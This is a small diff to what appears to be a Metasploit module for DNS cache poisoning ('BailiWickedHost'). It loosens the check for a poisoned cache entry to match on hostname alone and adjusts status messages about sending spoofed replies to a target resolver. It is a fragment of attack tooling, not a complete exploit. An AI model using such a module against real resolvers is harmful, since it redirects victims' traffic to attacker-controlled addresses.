@@ -204,9 +204,10 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 				if answer and answer.length > 0
 					answer = Resolv::DNS::Message.decode(answer)
 					answer.each_answer do |name, ttl, data|
-						if((name.to_s + ".") == hostname  and data.address.to_s == address)
+						
+						if((name.to_s + ".") == hostname)
 							t = Time.now + ttl
-							print_status("Failure: This hostname is already in the target cache: #{name} == #{address}")
+							print_status("Failure: This hostname is already in the target cache: #{name}")
 							print_status("         Cache entry expires on #{t.to_s}... sleeping.")
 							cached = true
 							sleep ttl
@@ -269,7 +270,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 				disconnect_ip
 				return
 			end			
-			print_status("Sending #{numxids} spoofed replies for each query")
+			print_status("Sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
 		end
 
 		# Flood the target with queries and spoofed responses, one will eventually hit
@@ -348,7 +349,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 						disconnect_ip
 						return
 					end
-					print_status("Now sending #{numxids} spoofed replies for each query")
+					print_status("Now sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
 				end				
 			end
 
@@ -365,8 +366,9 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 					if answer and answer.length > 0
 						answer = Resolv::DNS::Message.decode(answer)
 						answer.each_answer do |name, ttl, data|
-							if((name.to_s + ".") == hostname and data.address.to_s == address)
+							if((name.to_s + ".") == hostname)
 								print_status("Poisoning successful after #{queries} queries and #{responses} responses: #{name} == #{address}")
+								print_status("TTL: #{ttl} DATA: #{data.to_s}")
 								disconnect_ip
 								return
 							end
